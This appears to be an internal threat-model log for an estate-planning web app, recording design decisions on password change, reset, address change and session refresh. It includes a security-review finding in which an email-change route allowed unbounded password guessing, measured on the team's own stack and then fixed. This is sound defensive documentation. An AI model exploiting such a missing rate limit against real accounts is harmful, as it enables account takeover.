`@estate/notifications-client` is the single derivation for every CONSUMER of a
send outcome, used at all seven identity sites (the four that were already
correct included — one behaviour, one place).
`packages/notifications-client/test/delivery-outcome.spec.ts` then forbids a
consumer from NAMING the discriminant at all unless it is one of three declared
notifications adapters — vault, settlement and profile — which must name it for
a genuinely different reason: they translate the wire outcome into their own
service-level port, and TypeScript will not let them read `delivered` or
`recipientVerified` off the union without narrowing on `accepted` first. (They
are not the 503: `notifications_unavailable` comes from `deliversToRealChannels`,
a property of the adapter CLASS, checked by the service elsewhere. An earlier
draft of this paragraph credited `!accepted` with that refusal and was wrong.)
Each adapter collapses the refused arm to `delivered: false`, which is
`wasDelivered` by hand — so the fence additionally holds them to using
`accepted` ONLY as a negated gate (`if (!x.accepted)`), and an adapter that
started deriving a delivery fact any other way turns it red. The same fence
forbids hand-rolled `accepted:` literals in identity's test directory, where
four named constants typed as `SendOutcome` now carry the outcomes.

**Residuals, stated.**

- **[ACCEPTED]** *The scan is on the identifier, so a destructure is caught and
  `Object.values(outcome)[0]` is not.* Closing that wants the TypeScript AST,
  which is more than a fence should carry. The constants' `SendOutcome`
  annotation is the real shape check — it is the one place no cast intervenes —
  and it is a convention the fence enforces rather than something the compiler
  can.
- **[ACCEPTED]** *Two of the three wire translations have no test of their own.*
  See the paragraph below: the fence bounds them (they may only narrow) and
  does not close them.

The three adapters are left as they are, but the reason is narrower than an
earlier draft claimed. Only VAULT doubles the client port faithfully
(`notifier-adapters.spec.ts`, typed `NotificationsPort` / `Promise<SendOutcome>`);
settlement's `HttpNotifier` and profile's `HttpLinkNotifier` are never
constructed in a test at all — their suites double the SERVICE-level port above
them, so the wire translation itself is uncovered. What makes that safe rather
than lucky is that all three read `outcome.delivered` explicitly on the accepted
arm, so an incomplete literal fails SAFE; the residual is that two of the three
translations have no test of their own, which the fence bounds (they may only
narrow) but does not close.

**Proven live, on the disagreeing arm.** Two probe accounts against the running
stack with identity rebuilt from this branch; one keeps its recipient row, the
other's is deleted, which is exactly what M9's fire-and-forget feed leaves behind
when it misses. Both reset requests answer an identical `202`, so the
enumeration property is untouched. The control records
`password.reset_requested | delivered` in `auth_events` and
`{"delivered": "delivered"}` in the audit chain, and keeps one live code. The
recipient-less account records `failed` in both and keeps **no** live code — the
one nobody holds was retired. `notification_sends` holds the other half of the
proof: its `identity.password_reset` row exists with outcome `no_recipient`, and
that row is written by the notifications service itself, so its existence proves
the service ANSWERED (`accepted: true`) while `no_recipient` maps to
`delivered: false` — the precise arm on which the old read and the new one
disagree. Reverting either read turns its own integration case red against real
Postgres.

**One claim in the code was ALSO wrong and is corrected.** The comment beside the
reset's retire-on-failure said retiring prevents "a TTL-long lockout". It does
not: `lastMintedAt` orders over ALL rows including revoked ones, so retiring
cannot shorten the re-issue floor, and the unconditional retire before each mint
already stops a stale code blocking the next one. The code is retired because a
live reset code that reached no mailbox should not exist — which matters most in
the `carrier_failure` case, where the carrier may have taken the message before
failing.

## 6u. Threat-model delta — M20 PR1, the account password surface (2026-08-15)

**§6l shipped the control and nothing could reach it.** `POST /v1/auth/password`
has existed since M17 PR2 with no consumer anywhere — the route↔consumer fence
(M19 PR1) recorded it, with five siblings, under `EXEMPT_RECOVERY_SURFACE`
naming this pending slice. A password rotation nobody can perform is not a
mitigation for anything: §5 risk #1 (account takeover) lists credential rotation
among its responses, and until this PR the platform's answer to "your password
may be compromised" was that there was no answer. The exemption is flipped to a
real consumer in the same change as the client, on the M9 PR2 holders-flip rule.

**The edge adds no authority and no second gate.** The BFF forwards the caller's
own bearer and holds no credential (the M8 PR5 pattern, unchanged), so the
strongest thing a compromised BFF can do here is replay a session it is already
serving. It also deliberately does NOT re-validate the new password: identity's
schema is the gate, and a second copy at the edge is a copy free to drift from
the one that decides (the M12 upload-client rule). The BFF's own spec asserts a
four-character password reaches identity and is refused THERE.

**The refusals stay four, because their remedies are four.** `INVALID_CREDENTIALS`
(re-check the password), `STEPUP_REQUIRED` (find your authenticator),
`TOO_MANY_ATTEMPTS` (wait — M17 PR6's bound, whose 429 branch M19 PR4 taught the
edge to read) and `INVALID_REQUEST` (choose a longer password). Collapsing any
pair sends someone to do the wrong thing, and folding the bound into the
credential refusal would render "check your password" at somebody whose next
correct password will also be refused — the M9 rule that a control firing must
not read as an outage.

**`INVALID_CREDENTIALS` NOW MEANS A THIRD THING, AND THE COPY IS CHOSEN PER
SURFACE.** Identity answers one token for a rejected password, a rejected TOTP
code and now a rejected *current* password. M12 found the first collision (a
step-up prompt telling users their email and password combination was wrong on a
form with neither field) and fixed it with `stepUpMessageFor`; this is the same
finding a third time, closed the same way with `passwordChangeMessageFor`, whose
sentence also states that nothing changed — the fact a person most needs after a
refusal on a route that rewrites their credential.

**ONE STEP-UP PROMPT PER PAGE, still.** `/security` can be refused for every
reason `StepUpTarget` names — six, after PR2 added the address change, and this
sentence deliberately no longer carries a number that a later PR has to
remember to update (the PR5 review found three counts in three files, of which
only the union was right). The M15 PR3 defect is two identical "Confirm it's
you" fields no person or query can tell apart. `StepUpTarget` admits one at a time and every
other opener is disabled while one is up; the prompt renders as a SIBLING of the
form, never nested inside it (the M16 PR3a rule — a form inside a form is a tree
the DOM API accepts and no parser would build).

**WHICH HALF OF THE RETRY IS LOAD-BEARING WAS ESTABLISHED BY MUTATION, and my
first answer was wrong.** The retry carries the submitted attempt rather than
re-reading the inputs, which is the M13 review's fix for a step-up retry running
the action from the form's *current* state. Reverting that carry left every test
green: the real control is that the prompt REPLACES the form, so while a change
is pending there are no inputs to edit. The carry is kept as belt for a stated
reason — the moment somebody makes the form merely disabled rather than unmounted
(a plausible, otherwise harmless edit) the values become live again — and the
replacement itself is now pinned by its own assertion. Recorded because the
tempting move was to weaken the mutation until it went red and call the fix
proven.

**The confirm field is a typo guard and is never sent.** It exists because this
form replaces a credential the user cannot afterwards read back, and a mistyped
new password is a lockout the platform's own recovery path (§6m) then has to
undo. It is compared in the browser and dropped there; identity is asked about
one password, not two.

**The minimum was declared four times with nothing comparing them.** Identity's
schema, the browser's pre-flight, its hint text and its error copy each carried
`12`, so a change to the gate would have left three surfaces telling users
something false — the drift class this repo keeps closing. `password-policy.test.ts`
reads identity's controller as text and asserts every password minimum it
declares is either the constant this app shows or a bare presence check;
mutating identity to `min(14)` turns it red.

**The fence gained a check for the opposite failure.** `route-consumers.spec.ts`
asserted that every route is consumed or exempt, and would have stayed green
forever with this route exempt after a consumer landed — an exemption is a claim
about the world that rots. It now also asserts no exemption is STALE: an exempt
route that some consumer really addresses fails with instructions to flip it.
Verified with the exact regression.

**THE PAGE WAS TELLING EVERY ACCOUNT IT HAD A SECOND FACTOR.** Driving this
surface found a defect older than the PR and directly on it: GraphQL serialises
an enum as its member NAME, so the wire carries `"NONE"`, while the web app had
declared `MfaLevel` as `'none' | 'mfa' | 'stepup'` since M2. Every
`session.mfaLevel === 'none'` in the app was therefore permanently false.
Measured on the running stack against an account with no `mfa_methods` row and
`sessions.mfa_level = 'none'`: the security page showed **"MFA enrolled"** and
offered **"Re-enroll authenticator app"**, and the home page's session card said
the same. After the fix, same account and same session: "MFA not enrolled" and
"Set up authenticator app".

The consequence is a misstatement about a control, in the direction that stops
someone acting. A user reading "MFA enrolled" has no reason to enrol, so the
account most in need of a second factor is the one told it already has one —
and on this page that claim now sits directly above a password change whose
step-up gate is conditional on exactly that factor, so a factorless user sees
their password change complete with no challenge while the page insists a factor
protects it. It is not an authorization defect: `SecondFactorGate` reads the
database, never the browser, so nothing was permitted that should not have been.

**Neither existing gate could see it, for reasons worth keeping.** `tsc` compares
values against the DECLARATION, and the declaration was the thing that was wrong,
so a comparison that can never be true type-checks perfectly. Every fixture said
`mfaLevel: 'mfa'` — the same invented vocabulary — which is the M15 rule that a
fixture inventing an enum tests the fixture; the two tests that touched the
authenticator button were green under the defect because they used the enrolled
branch, and the `NONE` branch that a brand-new account hits had never been
rendered by any test. `graphql/enum-parity.test.ts` now derives all five enum
mirrors from the BFF's SDL and asserts them member for member, and the
factorless branch is pinned on both surfaces (`SessionCard` gained its first
test at all).

**NOT closed by this PR, and stated so it is not assumed.** There is still no
breach-corpus check on a chosen password (§4 TB1 lists it as a control), no
per-IP bound (§6k — identity has no client IP and neither public edge forwards
one), and no notification-suppression concern to add: identity already mails
`identity.password_changed` on its own security edge (§6l), which this surface
does not touch. The remaining recovery routes — reset request/complete and the
three address-change legs — stay exempt with their pending slices named, and PR2
and PR3 flip them. Separately measured while driving this: the web app never
refreshes an access token, so a signed-in browser reports "Your session has
ended" after 15 minutes while its session row is live for 30 days — the gap M20
PR4 is scoped to close, now observed rather than inferred.

### Residuals

- **[OWNER: M29]** *No breach-corpus check on a chosen password.* §4 TB1 lists
  it as a control and nothing implements it; it needs a corpus source and a
  privacy-preserving lookup, which is a change to the sign-in surface rather
  than to this page.
- **[OWNER: E1]** *No per-IP bound.* Identity has no client IP and neither
  public edge forwards one, so this is the same edge work §6k defers to the
  WAF — blocked on the AWS half, not on an engineering decision.
- **[CLOSED: §6x]** *The web app never refreshed an access token*, so a
  signed-in browser reported "Your session has ended" after 15 minutes while
  its session row was live for 30 days. Measured while driving this surface;
  M20 PR4 closed it.


## 6v. Threat-model delta — M20 PR2, the address-change surface (2026-08-15)

**§6n's own residual, closed by the PR that line predicted.** M17 PR4 shipped
all three legs of the address change with their copy decisions taken and no
surface at all, and recorded it as the same zero-callers gap as its siblings',
naming the M14 PR3 settings page as where the ceremony belonged. This is that
page. The route↔consumer fence's `EXEMPT_RECOVERY_SURFACE` now holds only the
two reset legs, which need a signed-out route group of their own (PR3).
**CLOSED by M20 PR3 (§6w)**: both reset legs are consumed and the constant
itself is deleted.

**The 202 is not a delivery receipt, and no layer is allowed to render it as
one.** Identity answers the request BEFORE it knows whether it will send
anything: the availability lookup, the encrypt, the stage and the mail all run
detached, precisely so an address that already belongs to somebody else is
answered identically to a free one and simply never mailed. That uniformity is
the control, and it constrains this surface all the way up:

- The BFF client returns `void`. There is no field a caller could mistake for
  confirmation, so the honest copy is forced rather than chosen.
- The success sentence is CONDITIONAL — "if *address* isn't already in use here,
  a code is on its way to it" — and its own test asserts the absence of a
  we-have-sent claim. Rendering the 202 as a send would tell one caller, in the
  one case that matters, exactly what the silent-availability control withholds.
- The re-issue refusal is named for the REQUEST, not for a send
  (`CODE_REQUESTED_RECENTLY`). Identity's `too_soon` covers the per-account floor
  AND the per-destination bound, and the destination bound fires on volume aimed
  at an address that may have been staged nothing and mailed nothing — so a code
  called `CODE_ALREADY_SENT`, with copy telling the reader to use the one they
  were sent, would send them looking for a mail that will never arrive.

**Two route-specific error mappers, because the shared one is wrong here.**
`mapError` keys 400 on the STATUS and answers `INVALID_REQUEST`; identity answers
**400** for a rejected account password, for both re-issue bounds, and for every
refused code. Without the mappers a wrong password and a rate refusal would both
reach the browser as "review your request", and the completion leg's single
uniform refusal would flatten into the same. The completion mapper also may not
fall through to the shared 401 branch, which maps `invalid_code` to
`INVALID_CREDENTIALS` — the login vocabulary, on a form whose only field is a
mailed code. That is the M12 collision, avoided rather than rediscovered.

**The uniform refusal is carried through, never re-derived.** Identity answers
one `invalid_code` for a code that is unknown, expired, spent, cancelled,
attempt-exhausted, mis-shaped, key-rotated, or whose candidate address was
registered by somebody else during the window. That last one is why the
uniformity matters beyond denying a progress meter: `address_taken` would leak
another account's existence to an authenticated stranger. The edge maps all of
them to one code, and the surface's copy carries the possibilities the server
deliberately will not distinguish — WITHOUT offering the shared sentence's
"send yourself a new one", because there is no resend route for a pending
change and offering a button that does not exist is how a stuck user stays
stuck.

**The completion form is always available, and that follows from a gap rather
than a preference.** Identity exposes no read of a pending change, so the page
cannot know on load whether one is outstanding. A code field that appeared only
after a request made in THIS tab would strand anyone who closed the page or who
reads their mail on a different device — so the field, the confirm button and
the ungated cancel are rendered unconditionally.

**Asymmetry, and the M15 label rule.** Asking is step-up gated (conditionally,
via `SecondFactorGate` — an account with no verified factor is let through, the
bootstrap case); finishing and cancelling are not. Somebody who has just
realised they typed the wrong address must not be sent to find an authenticator
first. The section reuses the page's ONE `StepUpTarget` prompt rather than
raising its own. Its password field is labelled "Account password" and not
"Current password" — caught by the existing password-change tests refusing to
run, because two fields on one page carrying the identical label are two inputs
neither a person tabbing through nor a query can tell apart; the two mailed-code
fields on the page (`EV1-` verification, `EC1-` change) are kept distinct for
the same reason, pinned by a whole-page label-uniqueness assertion.

**One page, two panels, one fact.** Completing a change moves the address AND
vouches for it in the same statement (redeeming the code proved the mailbox
seconds earlier), so the sibling `EmailVerificationPanel` would otherwise go on
saying "your email address hasn't been confirmed yet" directly above the sentence
saying it has — one page contradicting itself about a control, the shape M19 PR2
found in the trust card and M20 PR1 found in the session card. A page-level
client wrapper re-mounts that panel on completion, so the authority stays the
SERVER rather than a boolean passed between siblings.

### Residuals

- **[OWNER: M24]** *The app-shell `UnverifiedAddressBanner` goes stale until the next
  navigation.* It lives outside the page's tree and re-reads on `pathname`
  change only, so after a completed change it can keep asking for a
  confirmation that has just happened. The harmless direction — it nags about
  something already done rather than hiding a real gap — and closing it
  properly needs a shared client cache this app does not have.
- **[OWNER: M24]** *No surface shows the address currently on file.* Neither `session` nor the
  verification query returns it, so the "if it's the one you already sign in
  with" reading of identity's conflated `invalid_request` cannot be pre-empted
  by the UI. Identity genuinely does not distinguish a malformed address from
  the account's own, so the copy names the actionable possibility without
  asserting which applied.
- **[OWNER: M21]** *§6n's own remaining residuals are untouched:* an honest user typing a taken
  address still waits for a mail that never comes, and
  `identity.email_changed`'s reader still has no self-service response — the
  notice is a detection control, and until TB7 the remedy is support.

## 6w. Threat-model delta — M20 PR3, the password-reset surface (2026-08-15)

**The last two exempt recovery routes have a consumer, and the exemption is
GONE, not emptied.** M17 PR3 shipped the reset with every copy decision taken
and no surface at all; §6m recorded that as the zero-callers gap it was. Both
legs now have a product consumer (two unauthenticated BFF mutations and a
`/reset` page on the `(auth)` route group — the first ceremony in the product a
signed-OUT caller drives), and `EXEMPT_RECOVERY_SURFACE` is DELETED from the
route↔consumer fence rather than left as an empty constant: a named empty
exemption invites the next route to reuse it without re-arguing, and the fence's
stale-exemption check (M20 PR1) would in any case have refused the two entries
the moment the consumers landed. All six M17 recovery routes are now consumed.

**§6m's mailbox-is-account decision is now REACHABLE, unchanged.** The
weakening §6m records in bold — the mailed code and nothing else resets the
password, even for an account holding a verified TOTP or passkey — was until
now a property of routes nothing called. This surface is what makes it live,
so the sentence is re-affirmed here rather than softened: for an account with
a verified second factor, control of the mailbox is control of the account.
What bounds it is exactly §6m's list (the vault untouched under 2SKD, every
session revoked, the owner mailed on completion, the whole sequence audited),
and the recovery-codes ceremony remains the change that could strengthen it.

**The request leg KEEPS the shared error mapper, and that is the inverse of
§6v's decision for the same reason.** §6v needed route-specific mappers because
identity answers 400 for things that are not malformed bodies. On the reset
request the only 400 identity can produce IS a malformed body — the unknown
address, the 30-minute floor and the per-destination bound are all deliberately
inside the uniform 202 — so a route-specific mapper here would be a second copy
with nothing to distinguish. The completion leg reuses the SAME mapper as the
email-change completion (`mapCodeRedemptionError`, renamed from
`mapChangeCompleteError` at its second caller — one behaviour, one spelling,
the M8 PR2 rule), so a refused code cannot reach the login vocabulary on
either mailed-code surface.

**Third surface, third remedy for one refused code.** Identity answers one
`invalid_code` for every completion failure and the edge carries it through as
one code; what varies is the remedy, because the surfaces genuinely offer
different ways out. The verification panel says "send yourself a new one" (it
has a resend button); the address change says "cancel and start again" (it has
a cancel); the reset says "ask for a new one above" (the request form is on the
same page). A shared sentence would name a control that does not exist on two
of the three surfaces.

**A reset signs you in NOWHERE, and the edge keeps it that way.** Identity
mints nothing on completion (§6m's `mint-paths` fence) and the BFF resolver
touches no cookies in either direction: there is nothing returned to set, and
the stale pair a previously-signed-in browser may hold names a session the
completion just revoked server-side — dead, not live, so the M8 logout rule
(never clear cookies for a session that was not revoked) has nothing to
protect and clearing them would be busywork claiming meaning. The surface says
BOTH consequences out loud — signed out everywhere including this device,
signed in nowhere — because a user who expects a reset to sign them in reads
the login screen as the reset having failed, and it offers exactly the one
next step. Pinned at the wire (no Set-Cookie on the completion response) and
proven live: the completing browser landed on the signed-out shell.

**The completion form is always available — §6v's rule, harder.** No route
reads pending state, and the mail deliberately carries no link (M9: "we never
link you"), so the person holding a code may never have touched this browser
at all. Arriving at `/reset` in a fresh browser and typing the code is the
DESIGNED path, and the page says so in words rather than treating it as an
edge case.

**Proven live, end to end.** Request → the conditional notice ("If *address*
has an Estate account — and you haven't asked for a code in the last half
hour…"), with `{"ok":true}` byte-identical on the wire for an address with no
account and for the floored real one. A real SES message under the one uniform
subject carried `PR1-…` and the vault-unchanged sentence. A wrong code got the
uniform refusal copy on screen and `auth.password.reset_failed | system | {}`
in the trail — no actor, empty detail, so the trail carries no oracle the wire
withholds. The real code RETYPED THE WAY A HUMAN RETYPES IT (lowercase, every
dash dropped) was accepted; the success state replaced both forms; the browser
rendered the signed-out shell; the pre-reset session's token answered 401; the
old password answered 401 and the new one 200. `password_resets` held the row
redeemed-not-revoked; the delivery log recorded `identity.password_reset` and
`identity.password_changed` both `sent_unverified` (this account never proved
its address — §6t's `wasDelivered` recording the carrier's real answer); and
the chain carried `reset_requested {"delivered":"delivered"}` and
`reset_completed {"notified":"delivered","revokedSessions":"1"}`.

### Residuals

- **[ACCEPTED]** *The request form is an anonymous mail trigger, with no client-side bound —
  deliberately.* Identity's per-address bound and the 30-minute per-account
  floor are the gate (§6m), and a browser-side limiter would be the M12
  second-opinion shape: a copy of a rate rule free to disagree with the one
  that decides. The surface widens REACH (a UI where there was curl), not
  capability.
- **[OWNER: M30]** *A signed-in browser elsewhere still looks signed in after the revocation*,
  until its next request fails and renders the session-ended state. That is
  the access-token-TTL shape measured in PR1's drive (≤15 minutes), pointed
  the other way; there is no push channel, and PR4's session-continuity work
  is where the client's relationship to session lifetime gets rebuilt.
- **[OWNER: E1]** *§6m's remaining residuals are unchanged by having a surface*: no attempt
  cap on redemption (the redeemer is anonymous; the bound is 160 bits, the
  TTL and burn-on-attempt), and a reset does not clear PR1's login bound.

## 6x. Threat-model delta — M20 PR4, session continuity (2026-08-15)

**The access TTL was the whole usable session, and the refresh machinery had
existed unreached since M8.** The `Refresh` operation shipped at every layer —
SDL, BFF resolver, identity client, operations.ts, the persisted manifest —
with no caller anywhere, so a signed-in browser rendered "Your session has
ended" at the 15-minute access expiry while its session row was live and its
30-day refresh token sat unused in the jar (measured in the M20 PR1 drive).
Worse for the copy than for the security: the sentence was FALSE every time it
rendered, and the two states it now distinguishes — expired and revoked — were
indistinguishable on screen.

**The design is one reactive refresh at the client's single chokepoint.**
`gqlRequest` retries once after an UNAUTHENTICATED, behind one silent Refresh;
there is no timer, no proactive renewal, and no per-surface wiring. Two
resolver changes make the trigger coherent: `Query.session` now answers null
ONLY when there is nothing to authenticate with, and throws UNAUTHENTICATED
when a dead access token has a refresh cookie behind it — "no session" and
"refreshable" are different facts, and flattening them to null is exactly what
made the app read signed-out at every expiry. A consequence worth naming:
"Your session has ended" is now TRUE whenever a surface renders it, because
the code only reaches a caller after the refresh itself was refused.

**Single-flight is a correctness requirement, not an optimization.** Identity's
rotation-reuse detection (M16) treats an already-rotated refresh token as theft
and revokes the whole session — the right behavior against an actual thief, and
a self-revocation if two of the owner's own requests refresh concurrently with
the one shared cookie jar. Concurrency is therefore removed BY CONSTRUCTION at
both scopes: an in-tab promise latch, and a cross-tab Web Lock
(`estate.session.refresh`), since every tab of the origin shares the jar. A tab
that waited on the lock still sends its own Refresh afterwards; by then the jar
holds the winner's NEW token, so that is an ordinary second rotation, not a
reuse. Proven live: an assets page racing several queries into an expired token
produced EXACTLY one rotation (`refresh_token_prev_h` still held the pre-drive
hash afterwards).

**Only QUERIES are retried, and the first draft of this section got that
wrong.** The tempting claim — that a retry can never repeat a side effect,
because UNAUTHENTICATED means a guard refused before any handler ran — is true
of a SINGLE hop and false of the ELEVEN BFF resolvers that write and then read
back (`addContact` → `contacts`, `addFamilyMember` → `family`, `saveProfile`
→ `profile`, the grant/revoke pairs, …). If the write lands and the read-back
is refused, re-running the resolver re-runs the write, and
`createContact`/`createFamilyMember` carry no idempotency key — two contacts
of one name are legitimate, so no constraint catches the duplicate either. One
click, two rows, silently. The asset commands ARE safe (payload-keyed
`eventId`, M19) and the profile grants ARE safe (M13's unique indexes answer
409), but per-resolver safety is a fact the transport cannot see, so it does
not guess: the operation's own document says whether it is a `query`, and only
those repeat. A refused mutation reports `SESSION_RENEWED` — the session was
renewed, nothing was performed, the next attempt will work — because rendering
"your session has ended" there would be the false sentence this PR exists to
delete, one case over. The classification is total (every document begins
`query` or `mutation`, asserted in `operation-consumers.test.ts`) and its
default direction is the safe one: anything unrecognized is treated as a
mutation and not retried. The retry runs once whatever it answers; a second
UNAUTHENTICATED is returned as-is, because looping would hammer a dead
credential.

**Cookies are cleared in exactly one failure direction.** When identity refuses
the refresh credential as dead (its 401 → the mapped UNAUTHENTICATED), the BFF
clears both cookies: the pair is dead SERVER-SIDE, so clearing is tidying, not
stranding — the M8 rule protects live sessions, and identity just said this one
is not. Without the clear, every later page load would repeat the
session → refresh → refusal dance against a credential that can never work
again. An identity OUTAGE clears nothing — an outage must not wear the face of
a revocation (M16 PR2a) — and the pair survives for when the service returns.

**The fence: every GraphQL operation has a product caller**
(`operation-consumers.test.ts`), the route↔consumer fence's shape one layer up.
Deliberately NO exemption mechanism (the M20 PR3 rule — a named empty
exemption invites reuse): an operation lands in the same change as its first
caller, and the reverse direction (every caller names a real operation) is the
compiler's, `OperationName` being a closed union.

### Residuals

- **[ACCEPTED]** *A lost Set-Cookie response becomes a false theft signal.* If the browser
  never receives the response that carried the rotated pair (a network blip at
  exactly that moment), it retains the rotated-away token, and its next refresh
  trips rotation-reuse detection: that one session is revoked and the ledger
  records `rotation_reuse_detected` about an owner's own connection hiccup.
  Unclosable client-side — cookies ARE the response — and deliberately not
  weakened server-side, because a grace window for the previous token is
  precisely the replay the detection exists to refuse. The M16 extension
  recorded the same trade (persist-before-use is impossible when the browser
  owns the store); the cost is a re-login, and the other devices survive.
- **[ACCEPTED]** *Browsers without Web Locks (Safari < 15.4) keep the cross-TAB race.* The
  in-tab latch still holds there; two tabs refreshing in the same instant can
  still self-revoke. Every evergreen browser has the API.
- **[ACCEPTED]** *A signed-out page whose queries are authenticated-only costs one refused
  Refresh round trip.* The client cannot see the (httpOnly) jar, so an
  UNAUTHENTICATED from, say, the verification banner triggers one Refresh that
  the BFF refuses before any identity call. Pages that only ask `session` cost
  zero — the resolver answers null for a cookie-less caller and the client
  never escalates a null.
- **[OWNER: M28]** *A refused mutation costs the user one repeated click.* The transport
  refuses to guess which mutations are replay-safe, so it renews the session
  and asks. Making the write-then-read-back resolvers individually safe — an
  idempotency key on `createContact`/`createFamilyMember`, the M19 asset-command
  shape applied to profile — is what would let mutations retry too, and it is
  a profile-service change rather than a transport one.
- **[ACCEPTED]** *A retried QUERY is not quite free either, and the reason it is harmless is
  worth stating rather than assumed.* For a single-hop query the retry IS the
  only execution — UNAUTHENTICATED means a guard refused before any handler
  ran. `assetBeneficiaries` is the one multi-hop query resolver of the
  twenty-five (assets, then profile for the names), and both hops decrypt, so
  a refusal on the second hop makes the first hop's audited
  `crypto.field.decrypted` events happen twice for one user action. That does
  not trip TB4's detector, and specifically not by luck: `boundFor` requires
  BOTH the count bound and `maxDistinctSubjectsPerWindow` to be exceeded
  (2026-08-14), and a retry re-reads the SAME subjects — the count moves, the
  distinct count does not. Nothing is disclosed to anybody new; it is the
  owner's own trail, doubled.
- **[ACCEPTED]** *The 30-day session lifetime is a hard ceiling, unchanged.* `rotateTokens`
  deliberately never writes `expires_at` (M16), so refresh extends nothing and
  a month-old browser re-authenticates. That is the designed bound on a stolen
  jar, not a gap in this feature.

## 6y. Threat-model delta — M20 PR5, the security review (2026-08-15)

Five file-scoped discovery lenses over the milestone's own files (never a diff
range — the M13 rule), each in its own worktree pinned with `git checkout
--detach`, then two adversarial verifiers per candidate on different angles
(production reachability, and is-it-already-a-recorded-decision), both
defaulting to refuted. 21 agents, no losses; 11 raw findings, 8 verified, 3
dropped under the cap and LOGGED BY NAME — all three were then hand-verified and
all three were real. Every finding was re-checked by hand before anything
changed, and the one HIGH was reproduced by execution against the running stack
before and after the fix.

Fourteenth milestone running where every confirmed finding sits in machinery the
milestone introduced, with one exception noted below.

### The one that mattered: a second route checking the account password, unbounded

`POST /v1/auth/email/change/request` (M20 PR2) takes the current password for
exactly the reason `POST /v1/auth/password` does — the stolen-session threat —
and ran the identical gate order, conditional step-up then verification, with
nothing between them. The M17 PR6 review had put `PASSWORD_CHANGE_BOUND` in that
gap on the password route, measured after twenty-five unbounded guesses took an
account over. PR2 wrote the same shape one milestone later and did not carry the
bound.

MEASURED ON THE RUNNING STACK, on a factorless account — the class
`SecondFactorGate` deliberately admits so the bootstrap case stays reachable, and
therefore the class that reaches a password check at all:

| route | 25 wrong guesses, one session | ledger |
|---|---|---|
| `POST /v1/auth/email/change/request` | 25 × `400`, no refusal ever | `email_change.denied` × 25, **0 with a session id** |
| `POST /v1/auth/password` | 5 × `401`, then `429` | `password.change_failed` × 5, all attributed |

One secret, two routes, one bounded. Every other bound on the address-change
route sits DOWNSTREAM of the verification (the per-account re-issue floor and
the per-destination address bound both run after it), so nothing else could
have caught it, and recovering the password there defeats the bounded route
rather than tripping it.

**The fix is a shared gate, and the shape is the point.** `AccountPasswordGate`
(the `SecondFactorGate` precedent) is injected by both services;
`PASSWORD_CHANGE_BOUND` became `ACCOUNT_PASSWORD_BOUND` and counts BOTH routes'
failure kinds, because the M16 chokepoint rule says the thing to bound is the
SET of routes that read a secret — two budgets of five are a budget of ten to
anyone willing to alternate. The failure row is now attributed to the session,
without which the per-session half would have been blind to this route and one
stolen session could have spent the whole account ceiling. Post-fix, same
attack: five 400s then `429`, `email_change.denied` × 5 all attributed, and the
password route answers `429` HAVING SPENT NOTHING OF ITS OWN — which is the
shared budget visible from the outside. The owner's other session still gets the
ordinary refusal and their correct password still returns 202.

**A METHOD ON ONE SERVICE IS WHAT ALLOWED IT.** The bound was reachable only
from the class that happened to own it, so the second route did not bypass the
control so much as never meet it.

### The fence went green because its corpus was one file

`rate-bounds.spec.ts` asserts that every guessing bound covers the routes that
check its secret — over `auth.service.ts` ALONE. That was true to the property
while every bounded route lived in that class, and stopped being true the moment
a route moved to `email-change.service.ts`. A fence whose input is narrower than
its claim goes green for the same reason it is wrong.

The corpus is derived from the directory now, with a floor asserting it, and the
fence gained the check it never had: EVERY call to `hasher.verifyPassword` must
be declared with the bound that covers it, in both directions, anchored on the
verification rather than on a route decorator or a method name — a caller cannot
rename its way out of the call that scores a guess. Mutation-tested with the
exact regression (a new undeclared route reading the password) and with the
corpus narrowed back to one file.

### The other confirmed findings

- **An outage wore the face of a revocation.** `refreshSession` collapsed
  "identity refused the credential" and "the refresh never completed" into one
  boolean, so a dropped connection or an identity outage rendered "Your session
  has ended. Please sign in again." over a live 30-day session whose cookies the
  BFF had deliberately left in place — the M16 PR2a rule, broken by code citing
  it three lines above. Three outcomes now; only a refusal reports the session
  as ended.
- **`SESSION_RENEWED` claimed what its own neighbour says cannot be claimed.** A
  mutation refused with UNAUTHENTICATED may have written on its first hop and
  been refused on a later one — the whole reason mutations are not retried — yet
  the copy read "Nothing was changed — please try that again", inviting the
  retry the no-retry rule exists to prevent. It names the uncertainty and sends
  the reader to reload instead.
- **The step-up prompt never closed on a non-step-up refusal.** `StepUpPrompt`
  does not unmount itself, and these sections render it INSTEAD of their form,
  so a refusal after a genuine elevation left an error telling the reader to
  re-check a field no longer on screen. Four call sites, two of them
  pre-existing, all fixed — two fixed and two not would read as intentional.
- **The page contradicted itself about a control.** A password change or an
  address-change completion revokes every other session, and neither re-read the
  devices list, so "your other devices have been signed out" sat above a list
  still showing them.
- **The stale-exemption check could only see files already declared as
  consumers**, so a brand-new client module calling an exempt route was
  invisible to the check whose job is exactly that. Swept from the tree now.
- **The password-policy fence could not see registration.** Two of identity's
  password fields are literally named `password` — one about to be STORED, one
  about to be compared — so a field-keyed rule excused
  `RegisterSchema.password` dropping to `min(1)` as a presence check, satisfying
  a file whose header claims the assertion is TOTAL. Keyed on the (schema,
  field) pair now, classified as data, total in both directions.
- **`loadSession` read a missing field as data**, violating the rule the two
  loaders below it state — `{"data":{}}` produced a signed-in session of
  `undefined` and white-screened the page. A missing field is an ERROR, not a
  sign-out: a version skew says nothing about whether the caller is signed in.

### Refuted, and the three dropped under the cap

No finding was refuted by the verifiers this round, which is unusual and was
treated as a reason for more hand-checking rather than less: all eight were
re-derived from the source before anything was changed. The three dropped under
the fan-out cap were each verified by hand and each was real — a comment
asserting the reset surface "does not exist yet" (M20 PR3 shipped it), three
different counts of the step-up targets in three files (only the union was
right, and the prose no longer carries a number), and a line-based
comment-stripper in `operation-consumers.test.ts` that read whole paragraphs of
block comment as code.

### Residuals

- **[ACCEPTED]** *This delta opens nothing new, and says so rather than
  leaving a reader to infer it from an absent section.* All eleven findings
  were fixed in the same PR and each fix was mutation-tested; what the review
  did NOT do is re-open a settled trade-off, which is what the
  is-it-already-a-decision verifier exists to prevent.
- **[OWNER: E1]** *§6k's bounds are unchanged by widening one of them to a
  second route.* `ACCOUNT_PASSWORD_BOUND` now spans both routes that read the
  account password, and it is still account-keyed with a per-process address
  half. Per-caller limiting remains edge work.
- **[OWNER: M21]** *The corpus lesson was applied to one fence and not swept
  across the others.* The defect was that `rate-bounds.spec.ts` scanned a
  single file while claiming to cover a service; nothing has since asked the
  same question of the repo's other source-scanning fences, and a fence whose
  input is narrower than its claim goes green for the same reason it is wrong.


## 6z. Threat-model delta — M21 PR1, the operator grant ceremony (2026-08-17)

